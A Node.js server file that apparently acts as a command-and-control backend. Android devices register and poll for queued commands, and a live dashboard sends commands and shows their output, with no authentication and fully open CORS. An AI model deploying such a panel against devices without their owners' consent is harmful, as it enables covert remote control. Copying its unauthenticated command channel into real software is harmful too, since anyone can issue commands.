// server.js
import express from "express";
import { WebSocketServer } from "ws";
import http from "http";
import bodyParser from "body-parser";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
app.use(cors());
app.use(bodyParser.json());

const devices = new Map(); // clientId → { name, lastSeen, online }
const pendingCommands = new Map();
const dashboardClients = new Set();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


// --- HTTP ROUTES ---

app.post("/register", (req, res) => {
  const { clientId, deviceName } = req.body;
  if (!clientId) return res.status(400).send("Missing clientId");

  const existing = devices.get(clientId) || {};
  devices.set(clientId, {
    name: deviceName || existing.name,
    lastSeen: Date.now(),
    online: true,
  });

  console.log(`📱 Device registered: ${deviceName} (${clientId})`);
  broadcastDashboard();
  res.send({ status: "ok" });
});

// Heartbeat endpoint
app.post("/heartbeat", (req, res) => {
  const { clientId } = req.body;
  if (!clientId) return res.status(400).send("Missing clientId");

  const existing = devices.get(clientId);
  if (existing) {
    existing.lastSeen = Date.now();
    existing.online = true;
    devices.set(clientId, existing);
    broadcastDashboard();
  }
  res.send({ status: "ok" });
});

// Android polls for commands
app.get("/poll", (req, res) => {
  const { clientId } = req.query;
  if (!clientId) return res.status(400).send("Missing clientId");

  const cmds = pendingCommands.get(clientId) || [];
  pendingCommands.set(clientId, []);
  const existing = devices.get(clientId);
  if (existing) {
    existing.lastSeen = Date.now();
    existing.online = true;
    devices.set(clientId, existing);
  }
  broadcastDashboard();
  res.send(cmds);
});

app.post("/response", (req, res) => {
  const { clientId, output } = req.body;
  console.log(`📩 Response from ${clientId}: ${output?.slice(0, 100)}...`);
  broadcastToDashboard({ type: "response", clientId, output });
  res.send({ status: "received" });
});

app.post("/command", (req, res) => {
  const { targetClientId, command } = req.body;
  if (!devices.has(targetClientId)) return res.status(404).send("Device not found");
  const queue = pendingCommands.get(targetClientId) || [];
  queue.push({ command });
  pendingCommands.set(targetClientId, queue);
  console.log(`📤 Queued '${command}' for ${targetClientId}`);
  res.send({ queued: true });
});

// Serve dashboard page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

// --- WebSocket for live dashboard updates ---
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

wss.on("connection", (ws) => {
  dashboardClients.add(ws);
  console.log("🧠 Dashboard connected via WebSocket");

  ws.send(JSON.stringify({ type: "devices", devices: Object.fromEntries(devices) }));
  ws.on("close", () => dashboardClients.delete(ws));
});

function broadcastDashboard() {
  const payload = JSON.stringify({
    type: "devices",
    devices: Object.fromEntries(devices),
  });
  broadcast(payload);
}

function broadcastToDashboard(data) {
  broadcast(JSON.stringify(data));
}

function broadcast(payload) {
  for (const ws of dashboardClients) {
    if (ws.readyState === ws.OPEN) ws.send(payload);
  }
}

// --- Periodically check for offline devices ---
setInterval(() => {
  const now = Date.now();
  for (const [id, dev] of devices) {
    const wasOnline = dev.online;
    dev.online = now - dev.lastSeen < 15000; // 15s timeout
    if (dev.online !== wasOnline) broadcastDashboard();
  }
}, 5000);

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
